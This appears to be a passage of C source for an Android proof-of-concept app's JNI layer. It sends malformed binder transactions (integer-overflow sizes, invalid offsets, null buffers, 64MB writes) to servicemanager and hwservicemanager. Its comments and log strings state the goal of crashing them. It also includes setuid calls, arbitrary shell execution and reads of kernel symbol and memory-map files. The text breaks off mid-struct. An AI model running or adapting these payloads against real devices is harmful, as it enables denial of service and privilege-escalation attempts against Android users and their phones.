#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/stat.h>
#include <limits.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <time.h>

#include "binder.h"

#define LOG_TAG "PocJNI"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

static JavaVM* g_vm = NULL;

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    g_vm = vm;
    LOGD("JNI_OnLoad");
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved) {
    LOGD("JNI_OnUnload");
}

JNIEXPORT jobjectArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeListDir(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;

    DIR* dir = opendir(cpath);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (dir == NULL) {
        LOGE("opendir(%s) failed: %s", cpath, strerror(errno));
        return NULL;
    }

    int count = 0;
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] != '.') count++;
    }
    rewinddir(dir);

    jclass stringClass = (*env)->FindClass(env, "java/lang/String");
    if (stringClass == NULL) {
        closedir(dir);
        return NULL;
    }
    jobjectArray result = (*env)->NewObjectArray(env, count, stringClass, NULL);
    if (result == NULL) {
        closedir(dir);
        return NULL;
    }

    int idx = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        jstring name = (*env)->NewStringUTF(env, entry->d_name);
        if (name != NULL) {
            (*env)->SetObjectArrayElement(env, result, idx++, name);
            (*env)->DeleteLocalRef(env, name);
        }
    }
    closedir(dir);
    return result;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeReadFile(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;
    int fd = open(cpath, O_RDONLY);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (fd < 0) {
        LOGE("open(%s) failed: %s", cpath, strerror(errno));
        return NULL;
    }
    char buf[8192];
    ssize_t len = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (len <= 0) return NULL;
    buf[len] = '\0';
    return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeWriteFile(JNIEnv* env, jclass clazz, jstring path, jstring content) {
    if (path == NULL || content == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    const char* ccontent = (*env)->GetStringUTFChars(env, content, NULL);
    if (cpath == NULL || ccontent == NULL) {
        if (cpath) (*env)->ReleaseStringUTFChars(env, path, cpath);
        if (ccontent) (*env)->ReleaseStringUTFChars(env, content, ccontent);
        return NULL;
    }
    int fd = open(cpath, O_WRONLY);
    if (fd < 0) {
        LOGE("open(%s) for write failed: %s", cpath, strerror(errno));
        (*env)->ReleaseStringUTFChars(env, path, cpath);
        (*env)->ReleaseStringUTFChars(env, content, ccontent);
        return (*env)->NewStringUTF(env, strerror(errno));
    }
    ssize_t written = write(fd, ccontent, strlen(ccontent));
    close(fd);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    (*env)->ReleaseStringUTFChars(env, content, ccontent);
    if (written < 0) return (*env)->NewStringUTF(env, strerror(errno));
    return (*env)->NewStringUTF(env, "OK");
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeReadLink(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;
    char buf[PATH_MAX];
    ssize_t len = readlink(cpath, buf, sizeof(buf)-1);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (len < 0) {
        LOGE("readlink(%s) failed: %s", cpath, strerror(errno));
        return NULL;
    }
    buf[len] = '\0';
    return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeTestFd(JNIEnv* env, jclass clazz, jint fd) {
    char buf[256] = {0};
    int flags = fcntl(fd, F_GETFL);
    if (flags < 0) {
        snprintf(buf, sizeof(buf), "fcntl failed: %s", strerror(errno));
        return (*env)->NewStringUTF(env, buf);
    }
    int type = flags & O_ACCMODE;
    const char* type_str;
    switch(type) {
        case O_RDONLY: type_str = "RDONLY"; break;
        case O_WRONLY: type_str = "WRONLY"; break;
        case O_RDWR: type_str = "RDWR"; break;
        default: type_str = "UNKNOWN";
    }
    snprintf(buf, sizeof(buf), "flags=0x%x (%s), nonblock=%d", flags, type_str, (flags & O_NONBLOCK)?1:0);
    return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeOpenDevice(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return -1;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return -1;
    int fd = open(cpath, O_RDWR);
    if (fd < 0) {
        LOGE("open(%s) failed: %s", cpath, strerror(errno));
        (*env)->ReleaseStringUTFChars(env, path, cpath);
        return -errno;
    }
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    return fd;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeGetKernelInfo(JNIEnv* env, jclass clazz) {
    char result[4096] = {0};
    const char* files[] = {
        "/proc/version", "/proc/cmdline", "/proc/meminfo", "/proc/iomem", "/proc/modules",
        "/proc/sys/kernel/ostype", "/proc/sys/kernel/osrelease",
        "/sys/kernel/debug/kallsyms", "/sys/kernel/security/lsm",
        "/proc/self/status", "/proc/self/stat"
    };
    char buf[1024];
    for (size_t i = 0; i < sizeof(files)/sizeof(files[0]); i++) {
        int fd = open(files[i], O_RDONLY);
        if (fd >= 0) {
            ssize_t n = read(fd, buf, sizeof(buf)-1);
            close(fd);
            if (n > 0) {
                buf[n] = '\0';
                strcat(result, files[i]);
                strcat(result, ": ");
                strcat(result, buf);
                strcat(result, "\n");
            } else {
                strcat(result, files[i]);
                strcat(result, ": (empty)\n");
            }
        } else {
            strcat(result, files[i]);
            strcat(result, ": (unreadable)\n");
        }
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderGetVersion(JNIEnv* env, jclass clazz, jint fd) {
    char result[128] = {0};
    struct binder_version version;
    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
        snprintf(result, sizeof(result), "Protocol version: %d", version.protocol_version);
    } else {
        snprintf(result, sizeof(result), "BINDER_VERSION failed: %s", strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderIoctlTest(JNIEnv* env, jclass clazz, jint fd, jint cmd, jlong arg) {
    char result[256] = {0};
    int ret = ioctl(fd, cmd, (unsigned long)arg);
    if (ret == 0) {
        snprintf(result, sizeof(result), "ioctl(0x%x) succeeded", cmd);
    } else {
        snprintf(result, sizeof(result), "ioctl(0x%x) failed: %s", cmd, strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderSendTransaction(JNIEnv* env, jclass clazz, jint fd, jint handle, jint code, jint flags) {
    char result[512] = {0};
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = (uint32_t)handle,
            .cookie = 0,
            .code = (uint32_t)code,
            .flags = (uint32_t)flags,
            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };

    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    struct binder_transaction_data reply;
    bwr.read_size = sizeof(reply);
    bwr.read_buffer = (binder_uintptr_t)&reply;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret == 0) {
        snprintf(result, sizeof(result), "ioctl(BINDER_WRITE_READ) succeeded, read_consumed=%llu",
                 (unsigned long long)bwr.read_consumed);
        if (bwr.read_consumed > 0) {
            strcat(result, " (reply received)");
        } else {
            strcat(result, " (no reply)");
        }
    } else {
        snprintf(result, sizeof(result), "ioctl(BINDER_WRITE_READ) failed: %s", strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

static pid_t get_servicemanager_pid(void) {
    FILE *fp = popen("pidof servicemanager 2>/dev/null", "r");
    if (!fp) return -1;
    char buf[16];
    if (fgets(buf, sizeof(buf), fp)) {
        pclose(fp);
        return atoi(buf);
    }
    pclose(fp);
    return -1;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeGetServicemanagerPid(JNIEnv* env, jclass clazz) {
    return get_servicemanager_pid();
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeWaitServicemanagerRestart(JNIEnv* env, jclass clazz, jint oldPid, jint timeoutSec) {
    while (timeoutSec-- > 0) {
        pid_t newPid = get_servicemanager_pid();
        if (newPid > 0 && newPid != oldPid) return newPid;
        sleep(1);
    }
    return -1;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeSendMalformedGetService(JNIEnv* env, jclass clazz, jint fd, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return -1;
    size_t name_len = strlen(name) + 1;
    uint8_t *data = malloc(4 + name_len);
    if (!data) {
        (*env)->ReleaseStringUTFChars(env, jname, name);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, name, name_len);
    (*env)->ReleaseStringUTFChars(env, jname, name);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 1;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4 + name_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) return -errno;
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeSendHugeNameAddService(JNIEnv* env, jclass clazz, jint fd, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return -1;
    size_t name_len = strlen(name) + 1;
    uint8_t *data = malloc(4 + name_len);
    if (!data) {
        (*env)->ReleaseStringUTFChars(env, jname, name);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, name, name_len);
    (*env)->ReleaseStringUTFChars(env, jname, name);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4 + name_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) return -errno;
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeSendInvalidOffsets(JNIEnv* env, jclass clazz, jint fd) {
    uint8_t *data = malloc(4096);
    if (!data) return -1;
    memset(data, 0x41, 4096);

    binder_size_t offsets[10];
    for (int i = 0; i < 10; i++) offsets[i] = 8192 + i * 8;

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4096;
    tx.tdata.offsets_size = sizeof(offsets);
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) return -errno;
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeSendNullBuffer(JNIEnv* env, jclass clazz, jint fd) {
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 1024;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) return -errno;
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeSendIntegerOverflowGetService(JNIEnv* env, jclass clazz, jint fd) {
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 1;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 0xFFFFFFFF;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) return -errno;
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeAddService(JNIEnv* env, jclass clazz, jint fd, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return -1;
    size_t name_len = strlen(name) + 1;
    uint8_t *data = malloc(4 + name_len);
    if (!data) {
        (*env)->ReleaseStringUTFChars(env, jname, name);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, name, name_len);
    (*env)->ReleaseStringUTFChars(env, jname, name);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4 + name_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    uint8_t reply_buf[4096];
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(reply_buf);
    bwr.read_buffer = (binder_uintptr_t)reply_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) return -errno;

    if (bwr.read_consumed >= 4) {
        uint32_t *reply = (uint32_t*)reply_buf;
        if (reply[0] == BR_OK) return 0;
    }
    return -2;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeGetService(JNIEnv* env, jclass clazz, jint fd, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return -1;
    size_t name_len = strlen(name) + 1;
    uint8_t *data = malloc(4 + name_len);
    if (!data) {
        (*env)->ReleaseStringUTFChars(env, jname, name);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, name, name_len);
    (*env)->ReleaseStringUTFChars(env, jname, name);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 1;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4 + name_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    uint8_t reply_buf[4096];
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(reply_buf);
    bwr.read_buffer = (binder_uintptr_t)reply_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) return -errno;

    if (bwr.read_consumed >= 4) {
        uint32_t *reply = (uint32_t*)reply_buf;
        if (reply[0] == BR_OK) return 0;
    }
    return -2;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeSetUid(JNIEnv* env, jclass clazz, jint uid) {
    return setuid(uid);
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeSetResUid(JNIEnv* env, jclass clazz, jint uid) {
    return setresuid(uid, uid, uid);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeExecCommand(JNIEnv* env, jclass clazz, jstring jcmd) {
    const char *cmd = (*env)->GetStringUTFChars(env, jcmd, NULL);
    if (!cmd) return NULL;
    char buffer[4096];
    memset(buffer, 0, sizeof(buffer));
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        (*env)->ReleaseStringUTFChars(env, jcmd, cmd);
        return (*env)->NewStringUTF(env, "popen failed");
    }
    size_t total = 0;
    while (fgets(buffer + total, sizeof(buffer) - total, fp)) {
        total = strlen(buffer);
        if (total >= sizeof(buffer) - 1) break;
    }
    pclose(fp);
    (*env)->ReleaseStringUTFChars(env, jcmd, cmd);
    return (*env)->NewStringUTF(env, buffer);
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeForkExec(JNIEnv* env, jclass clazz, jstring jcmd) {
    const char *cmd = (*env)->GetStringUTFChars(env, jcmd, NULL);
    if (!cmd) return -1;
    pid_t pid = fork();
    if (pid == 0) {
        execl("/system/bin/sh", "sh", "-c", cmd, NULL);
        exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        (*env)->ReleaseStringUTFChars(env, jcmd, cmd);
        return WEXITSTATUS(status);
    }
    (*env)->ReleaseStringUTFChars(env, jcmd, cmd);
    return -1;
}

/* ---- hwservicemanager 操作用関数 ---- */
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwAddService(JNIEnv* env, jclass clazz, jint fd, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return -1;
    size_t name_len = strlen(name) + 1;
    uint8_t *data = malloc(4 + name_len);
    if (!data) {
        (*env)->ReleaseStringUTFChars(env, jname, name);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, name, name_len);
    (*env)->ReleaseStringUTFChars(env, jname, name);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4 + name_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    uint8_t reply_buf[4096];
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(reply_buf);
    bwr.read_buffer = (binder_uintptr_t)reply_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) return -errno;

    if (bwr.read_consumed >= 4) {
        uint32_t *reply = (uint32_t*)reply_buf;
        if (reply[0] == BR_OK) return 0;
    }
    return -2;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwGetService(JNIEnv* env, jclass clazz, jint fd, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return -1;
    size_t name_len = strlen(name) + 1;
    uint8_t *data = malloc(4 + name_len);
    if (!data) {
        (*env)->ReleaseStringUTFChars(env, jname, name);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, name, name_len);
    (*env)->ReleaseStringUTFChars(env, jname, name);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 1;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4 + name_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    uint8_t reply_buf[4096];
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(reply_buf);
    bwr.read_buffer = (binder_uintptr_t)reply_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) return -errno;

    if (bwr.read_consumed >= 4) {
        uint32_t *reply = (uint32_t*)reply_buf;
        if (reply[0] == BR_OK) return 0;
    }
    return -2;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwRunPayloads(JNIEnv* env, jclass clazz, jint fd) {
    char result[4096] = {0};
    int ret;
    char tmp[128];

    strcat(result, "[+] Running hwservicemanager crash payloads\n");

    size_t huge_size = 1024 * 1024 * 64;
    char* huge_buf = malloc(huge_size);
    if (huge_buf) {
        memset(huge_buf, 0x41, huge_size);
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = huge_size;
        bwr.write_buffer = (binder_uintptr_t)huge_buf;
        ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
        free(huge_buf);
        snprintf(tmp, sizeof(tmp), "  [1] 64MB write -> ret=%d (%s)\n", ret, (ret == 0) ? "SUCCESS" : strerror(errno));
        strcat(result, tmp);
    } else {
        strcat(result, "  [1] 64MB malloc failed\n");
    }

    struct binder_write_read bwr2;
    memset(&bwr2, 0, sizeof(bwr2));
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx2 = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = 1,
            .cookie = 0,
            .code = 0,
            .flags = 0,
            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };
    bwr2.write_size = sizeof(tx2);
    bwr2.write_buffer = (binder_uintptr_t)&tx2;
    ret = ioctl(fd, BINDER_WRITE_READ, &bwr2);
    snprintf(tmp, sizeof(tmp), "  [2] TX handle=1 -> ret=%d (%s)\n", ret, (ret == 0) ? "SUCCESS" : strerror(errno));
    strcat(result, tmp);

    struct binder_write_read bwr3;
    memset(&bwr3, 0, sizeof(bwr3));
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx3 = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = 0,
            .cookie = 0,
            .code = 0,
            .flags = TF_ONE_WAY,
            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };
    struct binder_transaction_data reply3;
    bwr3.write_size = sizeof(tx3);
    bwr3.write_buffer = (binder_uintptr_t)&tx3;
    bwr3.read_size = sizeof(reply3);
    bwr3.read_buffer = (binder_uintptr_t)&reply3;
    ret = ioctl(fd, BINDER_WRITE_READ, &bwr3);
    snprintf(tmp, sizeof(tmp), "  [3] TX handle=0,oneway -> ret=%d, read_consumed=%llu\n", ret, (unsigned long long)bwr3.read_consumed);
    strcat(result, tmp);

    struct binder_node_debug_info debug_info;
    memset(&debug_info, 0, sizeof(debug_info));
    ret = ioctl(fd, BINDER_GET_NODE_DEBUG_INFO, &debug_info);
    snprintf(tmp, sizeof(tmp), "  [4] BINDER_GET_NODE_DEBUG_INFO -> ret=%d (%s)\n", ret, (ret == 0) ? "SUCCESS" : strerror(errno));
    strcat(result, tmp);

    struct binder_node_info_for_ref info;
    memset(&info, 0, sizeof(info));
    info.handle = 0;
    ret = ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info);
    if (ret == 0) {
        snprintf(tmp, sizeof(tmp), "  [5] NODE_INFO handle=0 -> strong=%u, weak=%u\n", info.strong_count, info.weak_count);
    } else {
        snprintf(tmp, sizeof(tmp), "  [5] NODE_INFO handle=0 -> ret=%d (%s)\n", ret, strerror(errno));
    }
    strcat(result, tmp);

    uint8_t *data6 = malloc(4096);
    if (data6) {
        memset(data6, 0x42, 4096);
        binder_size_t offsets6[10];
        for (int i = 0; i < 10; i++) offsets6[i] = 8192 + i * 8;
        struct {
            uint32_t cmd;
            struct binder_transaction_data tdata;
        } __attribute__((packed)) tx6;
        tx6.cmd = BC_TRANSACTION;
        tx6.tdata.target.handle = 0;
        tx6.tdata.code = 1;
        tx6.tdata.flags = 0;
        tx6.tdata.data_size = 4096;
        tx6.tdata.offsets_size = sizeof(offsets6);
        tx6.tdata.data.ptr.buffer = (binder_uintptr_t)data6;
        tx6.tdata.data.ptr.offsets = (binder_uintptr_t)offsets6;

        struct binder_write_read bwr6;
        memset(&bwr6, 0, sizeof(bwr6));
        bwr6.write_size = sizeof(tx6);
        bwr6.write_buffer = (binder_uintptr_t)&tx6;
        bwr6.read_size = 0;
        bwr6.read_buffer = 0;
        ret = ioctl(fd, BINDER_WRITE_READ, &bwr6);
        free(data6);
        snprintf(tmp, sizeof(tmp), "  [6] Invalid offsets (GET_SERVICE) -> ret=%d (%s)\n", ret, (ret == 0) ? "SUCCESS" : strerror(errno));
        strcat(result, tmp);
    }

    strcat(result, "[+] Payloads executed.\n");
    return (*env)->NewStringUTF(env, result);
}

/* ---- servicemanager に hwservicemanager ペイロードを転用（クラッシュ用） ---- */
JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeRunHwPayloadsOnServiceManager(JNIEnv* env, jclass clazz, jint fd) {
    char result[4096] = {0};
    int ret;
    char tmp[128];

    strcat(result, "[+] Executing hwservicemanager-style payloads on /dev/binder (to crash servicemanager)\n");

    size_t huge_size = 1024 * 1024 * 64;
    char* huge_buf = malloc(huge_size);
    if (huge_buf) {
        memset(huge_buf, 0x41, huge_size);
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = huge_size;
        bwr.write_buffer = (binder_uintptr_t)huge_buf;
        ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
        free(huge_buf);
        snprintf(tmp, sizeof(tmp), "  [1] 64MB write -> ret=%d (%s)\n", ret, (ret == 0) ? "SUCCESS" : strerror(errno));
        strcat(result, tmp);
    } else {
        strcat(result, "  [1] 64MB malloc failed\n");
    }

    struct binder_write_read bwr2;
    memset(&bwr2, 0, sizeof(bwr2));
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx2 = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = 1,
            .cookie = 0,
            .code = 0,
            .flags = 0,
            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };
    bwr2.write_size = sizeof(tx2);
    bwr2.write_buffer = (binder_uintptr_t)&tx2;
    ret = ioctl(fd, BINDER_WRITE_READ, &bwr2);
    snprintf(tmp, sizeof(tmp), "  [2] TX handle=1 -> ret=%d (%s)\n", ret, (ret == 0) ? "SUCCESS" : strerror(errno));
    strcat(result, tmp);

    struct binder_write_read bwr3;
    memset(&bwr3, 0, sizeof(bwr3));
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx3 = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = 0,
            .cookie = 0,
            .code = 0,
            .flags = TF_ONE_WAY,
